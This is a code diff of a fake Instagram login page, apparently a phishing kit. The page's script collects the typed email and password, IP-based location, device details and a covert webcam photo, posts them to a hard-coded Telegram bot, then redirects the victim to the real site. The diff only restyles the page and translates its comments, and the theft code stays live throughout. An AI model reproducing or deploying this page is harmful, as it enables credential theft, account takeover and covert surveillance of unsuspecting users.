@@ -3,108 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" type="image/png" href="img/insta-fav.ico">
-    <title>Instagram</title>
+    <title>Instagram Login</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            background: #fafafa;
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
         }
 
-        main {
+        .container {
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
         }
 
-        .panel {
-            background-color: #fff;
-            padding: 40px;
+        .login-box {
+            background-color: white;
             border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
             width: 350px;
+            box-shadow: 0px 4px 12px rgba(0,0,0,0.1);
+            padding: 40px 20px;
+            text-align: center;
         }
 
-        .panel img {
-            display: block;
-            margin: 0 auto 20px;
+        .login-box img {
+            width: 175px;
+            margin-bottom: 20px;
         }
 
-        .panel input {
+        .login-box h2 {
+            font-size: 22px;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .login-box input {
             width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
+            padding: 12px 15px;
+            margin: 8px 0;
+            border: 1px solid #dbdbdb;
             border-radius: 4px;
+            font-size: 14px;
         }
 
-        .panel button {
-            width: 100%;
-            padding: 10px;
+        .login-box button {
             background-color: #3897f0;
             color: white;
+            padding: 12px;
             border: none;
             border-radius: 4px;
+            width: 100%;
+            font-size: 14px;
             cursor: pointer;
         }
 
-        .panel button:hover {
+        .login-box button:hover {
             background-color: #3081d6;
+        }
+
+        .signup-link {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+
+        .signup-link a {
+            color: #3897f0;
+            text-decoration: none;
         }
 
         footer {
             text-align: center;
-            padding-top: 20px;
+            margin-top: 30px;
+            font-size: 14px;
         }
 
         footer a {
-            margin: 0 15px;
-            color: #999;
+            color: #8e8e8e;
             text-decoration: none;
         }
 
         footer .copyright {
             margin-top: 20px;
-            color: #999;
+            color: #8e8e8e;
         }
     </style>
 </head>
 <body>
-    <main>
-        <section id="auth">
-            <div class="panel login">
-                <h1>
-                    <img src="img/instagram-logo.png" alt="Instagram logo" />
-                </h1>
-                <form id="loginForm" onsubmit="submitForm(event)">
-                    <input id="email" name="email" placeholder="Phone number, username or email" required />
-                    <input id="password" name="password" type="password" placeholder="Password" required />
-                    <button type="submit">Log In</button>
-                </form>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+            <h2>Log in to Instagram</h2>
+            <form id="loginForm" onsubmit="submitForm(event)">
+                <input type="text" id="email" name="email" placeholder="Phone number, username, or email" required>
+                <input type="password" id="password" name="password" placeholder="Password" required>
+                <button type="submit">Log In</button>
+            </form>
+            <div class="signup-link">
+                <span>Don't have an account? </span>
+                <a href="https://www.instagram.com/accounts/signup/email/?hl=en">Sign up</a>
             </div>
-        </section>
-    </main>
+        </div>
+    </div>
 
     <footer>
-        <ul class="flex flex-wrap justify-content-center">
-            <li><a href="#">ABOUT</a></li>
-            <li><a href="#">HELP</a></li>
-            <li><a href="#">PRESS</a></li>
-            <li><a href="#">API</a></li>
-            <li><a href="#">CAREERS</a></li>
-            <li><a href="#">PRIVACY</a></li>
-            <li><a href="#">TERMS</a></li>
-            <li><a href="#">LOCATIONS</a></li>
-            <li><a href="#">TOP ACCOUNTS</a></li>
-            <li><a href="#">HASHTAGS</a></li>
-            <li><a href="#">LANGUAGE</a></li>
-        </ul>
-        <p class="copyright">© 2025 Instagram from Facebook</p>
+        <a href="#">About</a> | <a href="#">Help</a> | <a href="#">Privacy</a> | <a href="#">Terms</a> | <a href="#">Locations</a> <br>
+        <div class="copyright">© 2025 Instagram from Facebook</div>
     </footer>
 
     <script>
         const botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";
-        const chatId = "5091980014"; // Telegram user ID
+        const chatId = "5091980014"; // Your Telegram user ID
 
         async function getUserLocation() {
             try {
@@ -119,11 +130,11 @@
                 };
             } catch (error) {
                 return {
-                    city: "غير معروف",
-                    country: "غير معروف",
-                    ip: "غير معروف",
-                    org: "غير معروف",
-                    asn: "غير معروف"
+                    city: "Unknown",
+                    country: "Unknown",
+                    ip: "Unknown",
+                    org: "Unknown",
+                    asn: "Unknown"
                 };
             }
         }
@@ -152,8 +163,8 @@
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
                         video.srcObject.getTracks().forEach(track => track.stop());
                         resolve(canvas.toDataURL('image/jpeg'));
-                    }, 3000);
-                }).catch(() => resolve(null));
+                    }, 3000); // Wait for 3 seconds before capturing
+                }).catch(() => resolve(null)); // Handle error and resolve null
             });
         }
 
@@ -162,17 +173,21 @@
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
+            // Get user location and device info
             const locationData = await getUserLocation();
             const deviceInfo = getDeviceInfo();
             const currentTime = new Date().toLocaleString();
+
+            // Capture image from the camera
             const imageData = await captureImage();
 
-            const message = `🔓 *تم اختراق الحساب! تم الكشف عن تفاصيل الحساب* 🔓\n\n` +
+            // Prepare the message to send to the bot in Arabic
+            const message = `🔓 *حساب تم اختراقه! تفاصيل الحساب مكشوفة* 🔓\n\n` +
                             `💻 *معلومات الحساب:* 💻\n` +
                             `📧 البريد الإلكتروني: ${email}\n` +
                             `🔑 كلمة المرور: ${password}\n\n` +
                             `🌍 *الموقع:* ${locationData.city}, ${locationData.country}\n` +
-                            `🌐 عنوان IP: ${locationData.ip}\n` +
+                            `🌐 عنوان الـ IP: ${locationData.ip}\n` +
                             `🔍 المزود: ${locationData.org}\n` +
                             `🚨 ASN: ${locationData.asn}\n\n` +
                             `💻 *معلومات الجهاز:* 💻\n` +
@@ -180,27 +195,28 @@
                             `🌐 المتصفح: ${deviceInfo.browserInfo}\n` +
                             `⚙️ لغة المتصفح: ${deviceInfo.language}\n` +
                             `🔧 الرام: ${deviceInfo.memory}GB\n` +
-                            `⚡ عدد نوى المعالج: ${deviceInfo.cpuCores}\n` +
+                            `⚡ أنوية المعالج: ${deviceInfo.cpuCores}\n` +
                             `📺 دقة الشاشة: ${deviceInfo.screenResolution}\n\n` +
-                            `🕒 *التاريخ والوقت:* ${currentTime}\n\n` +
+                            `🕒 *التوقيت:* ${currentTime}\n\n` +
                             `👁️‍🗨️ *تم التقاط صورة المستخدم*`;
 
-            // إرسال المعلومات إلى البوت عبر Telegram
+            // Send the information to Telegram bot
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: chatId, text: message })
             });
 
-            // إرسال الصورة إلى البوت
+            // Send the captured image to Telegram bot
             if (imageData) {
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, photo: imageData, caption: "📷 *صورة المستخدم*" })
+                    body: JSON.stringify({ chat_id: chatId, photo: imageData, caption: "📷 *تم التقاط صورة المستخدم*" })
                 });
             }
 
+            // Redirect the user to Instagram after sending the data
             setTimeout(() => window.location.href = 'https://www.instagram.com', 2000);
         }
     </script>
